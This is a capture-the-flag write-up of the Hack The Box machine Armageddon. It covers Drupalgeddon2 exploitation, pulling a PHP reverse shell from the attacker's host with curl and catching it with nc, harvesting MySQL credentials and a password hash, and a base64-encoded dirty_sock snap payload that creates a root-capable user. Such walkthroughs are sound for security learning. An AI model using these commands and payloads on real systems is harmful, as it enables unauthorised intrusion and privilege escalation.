---
layout: post
title: Armageddon
published: false
---

**Armageddon is an easy box from Hack The Box.**

### Enumeration

Nmap returns just 2 ports, 22 and 80. The web server appears to be running Drupal 7. A more specific version number could be helpful.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
```
Checking out http://10.10.10.233/CHANGELOG.txt reveals that the server is running Drupal 7.56 as of its most recent update.

![Pasted image 20210621113554](https://user-images.githubusercontent.com/60187707/126873761-2f8afa53-cb82-4c77-8eac-883e5ff5c5e4.png)

### Exploitation

Checking for any publicly available exploits with `searchsploit drupal 7.56`:

![Pasted image 20210621121658](https://user-images.githubusercontent.com/60187707/126873797-fd90f43a-f55c-4db0-b99a-3284061bf326.png)

Drupal 7.56 looks like it should be vulnerable to the [Drupalgeddon2 exploit.](https://michaelkoczwara.medium.com/drupalgeddon-2-b16c3095ae18)

I can copy that script over with `searchsploit -m php/webapps/44449.rb`.

Run the script, which I've renamed for ease of use, and I have a low-priv shell as user `apache`:

`ruby drupalgeddon2.rb 10.10.10.233`

![Pasted image 20210621121249](https://user-images.githubusercontent.com/60187707/126873920-9a1562f2-2f84-403d-bcdf-18d201780bcf.png)

The shell does not have a lot of functionality, unfortunately. I can't even change directories so I need to find a more persistent solution.

I have access to `curl` and am able to write to the web root, so I'll upload the handy [php-reverse-shell from pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) and use that instead.

First, I host my reverse shell on a web server of my own with `sudo python -m SimpleHTTPServer 80`.

Then `curl http://10.10.14.22/rev.php -o rev.php` in the drupalgeddon shell to pull it down and write it to the web root.

Finally, start a listener on my box with `nc -lvnp 80` and call the reverse shell with `curl 10.10.10.233/rev.php`.

![Pasted image 20210621123707](https://user-images.githubusercontent.com/60187707/126874292-ab142bd9-0880-4d07-b6ee-825673a2d22c.png)

That's more like it. Now I can actually move around the file system.

### Privilege Escalation

This new shell is admittedly not much better than the drupalgeddon one. The usual python shell upgrade tricks don't work, so I'll have to make do with what I've got.

Digging through web config files in `/var/www/html/sites/default` there is a file `settings.php` that contains some interesting information.
```
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
```
MySQL creds!
Due to the nature of the shoddy shell I'm using, MySQL behavior is a little weird.
I try to connect to the DB with `mysql -u drupaluser -p` and enter the password when prompted, but I don't get any response.
It took a while to put together, but MySQL is accepting the commands, it just won't output the results until I send an exit command, at which point it returns the results of my queries all at once.
So, after some trial and error, and stumbling through in the dark, I manage to find a password hash in the `users` table of the `drupal` database.
```
use drupal;
select * from users;
exit
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
```

I copy the hash into a file and send that to `john` to see if he can crack it.

`john bruce.txt --wordlist=/usr/share/wordlists/rockyou.txt`

![Pasted image 20210621172257](https://user-images.githubusercontent.com/60187707/126874861-267b8f36-3f84-443c-aae1-2e7be5d31ab9.png)

Looks like `brucetherealadmin` password is `booboo`.

I use those creds to SSH in:

![Pasted image 20210621172323](https://user-images.githubusercontent.com/60187707/126874912-1e072d06-213d-40f4-831d-5a3098942c1b.png)

Time to see what my man bruce can get up to.

`sudo -l` to check his sudo permissions.

![Pasted image 20210621172512](https://user-images.githubusercontent.com/60187707/126875007-5f2c5980-5587-4c53-a944-956f4b0f753b.png)

Bruce has the ability to install a snap package as the root user. It shouldn't be too hard to leverage that into a root shell.

I found [this one-liner](https://notes.vulndev.io/notes/redteam/privilege-escalation/misc-1) which will create a user with root privileges.

```
python -c 'print("aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "==")' | base64 -d > payload.snap
```

With the snap package created, install it:

`sudo /usr/bin/snap install payload.snap --dangerous --devmode`

`su dirty_sock` to become the new user.

`sudo -i` to drop into a root shell.

![image](https://user-images.githubusercontent.com/60187707/126875181-32fce89d-8dfe-493a-b0fd-cb3f24eedd62.png)




